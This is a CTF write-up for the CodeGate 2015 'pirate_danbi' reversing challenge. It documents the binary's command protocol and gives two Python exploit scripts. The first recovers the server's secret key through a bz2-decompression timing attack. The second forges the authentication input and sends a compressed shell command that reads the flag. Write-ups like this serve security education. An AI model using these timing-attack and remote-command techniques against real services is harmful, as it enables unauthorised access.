---
title: '[CodeGate CTF 2015 - Quals] pirate_danbi'
author: tinduong, k9, trichimtrich
layout: post
category: ctf - clgt crew
excerpt: Reversing a binary that manipulates bz2 file.
thumbnail: /assets/2015/03/codegate-danbi-thumbnails.jpg
tags:
  - ctf
  - codegate
  - reversing
  - side channel
  - timing
---

**Category:** Reversing

**Points:** 1000

**Description:**

> Binary: http://binary.grayhash.com/c46a02c63c233dd9c62cececff9f52b5/pirate_danbi 
> MD5SUM of priate_danbi : ebdcfa91ae9a270ccc15230019126c6d 
>
> OS: Ubuntu 14.04 (Kernel: 3.13.0-44)
>  /lib/x86_64-linux-gnu/libc-2.19.so
>  /lib/x86_64-linux-gnu/libbz2.so.1.0.4
>  /lib/x86_64-linux-gnu/ld-2.19.so
>  /lib/x86_64-linux-gnu/ld-2.19.so
>
> Server1 IP : 54.65.162.169
> Port : 8888
>
> Server2 IP : 54.92.37.119
> Port : 8888


## Write-up

Let's start by running the file command :

>root@tinduong:~# file pirate_danbi
>pirate_danbi: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=f63963a28bb50da4a9bcf5cd383ffdee48fd5b05, stripped

Load the binary in IDA Pro and analyze the code. The binary is quite simple. It first read 8 bytes secret key from file and store in a buffer then waits for commands.

![](/assets/2015/03/codegate-danbi-1.png)

Each command should have following format:

{% highlight c %}
===============================
|func_code|size of data| data |
===============================
|  1 byte |   2 bytes  | vary |
===============================
{% endhighlight %}

Depend on what func_code is, the corresponding function will be called. There are 9 functions as you can see at 0x401A68

![](/assets/2015/03/codegate-danbi-2.png)

In summary, what we need to notice about this binary are:

* We can write our data into a bz2 file.
* We can extract the bz2 if dw_writeable = 1.
* If our processed data from authentication function is equal to "YO_DANBI_CREW_IN_THE_HOUSE.", dw_run_shell can be set to 1.
* We can use sh to execute file which is extracted from the bz2 if dw_run_shell = 1.
* What we input in authentication function (function code 1) will affect to value of dw_writeable and dw_run_shell.

Authentication function gets an input and check whether its length is divisible by 8 (0x0400EAA).

![](/assets/2015/03/codegate-danbi-3.png)

Then it does some calculation (0x0400EDB) with secret key and our data, save the result to st_main. 

![](/assets/2015/03/codegate-danbi-4.png)

We need to set dw_wriable to 1 to be able to extract data from bz2 file. Authentication function takes last 8 bytes of our data xor with secret key. The last byte of the result is the number of byte to be checked. Those XOR-ed bytes must be equal in order to change the value of dw_writable to 1.

If dw_writable is 1 and we use extract command (0x04011B6), the binary takes more time to extract bz2 file. Hence, we can easily use timming attack to brute-force the secret key byte by byte.

{% highlight python %}
#author: k9
#/usr/bin/env python
import socket, time

'''
Server setup:
- export REMOTE_HOST=anything
- echo -n key8bytes > /home/pirate_danbi/key
- socat TCP-LISTEN:2323,reuseaddr,fork EXEC:"stdbuf -i0 -o0 ./pirate_danbi"
'''

ip,port = '127.0.0.1',2323
#ip,port = '54.65.162.169',8888

#python -c 'print "A"*0x2800*10000' | bzip2 -9 > a.bz2
bz2 = '425a68393141592653597946ad93015f8e0400a0000008200030804d4642a025a90a80973141592653597946ad93015f8e0400a0000008200030804d4642a025a90a80973141592653599d259396005133c4208010200000040008200030cd340a506f28a21378a8a213c5dc914e142422ac9fbf40'.decode('hex')


def xor(last,i):
    return chr(ord(last)^i)

def brute(c,recovered):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.setblocking(0)
    i = len(recovered)+1
    key = '12345678'+'\xff'*(8-i)+c+''.join([xor(ci,i) for ci in recovered])
    buf = '\x01\x00\x10'+key+'\x02\x00'+chr(len(bz2))+bz2
    buf += '\x03\x00\x00'*1000  #decompress bz2 stream
    buf += '\x01\x00\x01\x00'   #exit()
    s.send(buf)
    t = time.time()
    s.setblocking(1)
    s.recv(1024),
    cost = time.time()-t
    print str(cost)[:5],":",c.encode('hex'),"=>",recovered.encode('hex')
    return cost

recovered = ''
for i in range(8):
    for c in range(0x0a,0x100): #key may be unprintable
        c = chr(c)
        val = brute(c,recovered)
        if val>10:  #depends on network lag + server processing speed
            recovered = xor(c,i+1)+recovered
            break
print "key:",repr(recovered)
#key of real Danbi is '\x88\xfe\xdd\xa0\x20\x49\x88\x20'
print " hex:",recovered.encode('hex')
    #time.sleep(1) #sleep if needed

{% endhighlight %}

This approach is one of two ways to solve this challenge.

![](/assets/2015/03/codegate-danbi-5.png)

We have key and output (YO_DANBI_CREW_IN_THE_HOUSE.), we need a correct input to send to authentication function. Just reverse the calculation and we get it, then send data to server in the following step:

- Send command 1 with our input.
- Send command 4 to set dw_run_shell to 1
- Send command 2 with bz2 compressed data.
- Send command 3 to decompress bz2.
- Send command 5 to execute shell.
- Get flag and submit.

{% highlight python %}
#author: tinduong
import socket
import bz2


IP = '54.92.37.119'
PORT = 8888

def GenInput(key, output):
    for i in xrange(32 - len(output) + 1):
        output += '\x01'
    data = ['\x00' for i in xrange(32)]    
    #Last block is xored with key
    for i in xrange(8):
        data[8*3 + i] = chr(ord(output[24 + i]) ^ ord(key[i]))
    
    #Other blocks
    for i in xrange(2, -1, -1):
        for j in xrange(7, -1, -1):
            x = (ord(output[8 * i + j]) - ord(key[j])) & 0xff
            x = x ^ ord(data[8 * i + j + 8])
            data[8 * i + j] = chr(x)
    return ''.join(data)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
 
key = '\x88\xfe\xdd\xa0\x20\x49\x88\x20'
passwd = 'YO_DANBI_CREW_IN_THE_HOUSE.\x00'
#SEND INPUT
s.send('\x01\x00\x20' + GenInput(key,passwd))
#VERIFY KEY
s.send('\x04\x00\x00')
#SEND BZ
x = bz2.compress('cat /home/pirate_danbi/flag\n')
s.send('\x02\x00' + chr(len(x)) + x)
#DECOMPRESS
s.send('\x03\x00\x00')
#EXEC SHELL
s.send('\x05\x00\x00')
print s.recv(1024)
{% endhighlight %}

Flag is: *barking_danbi_is_waiting_for_you_at_finals*
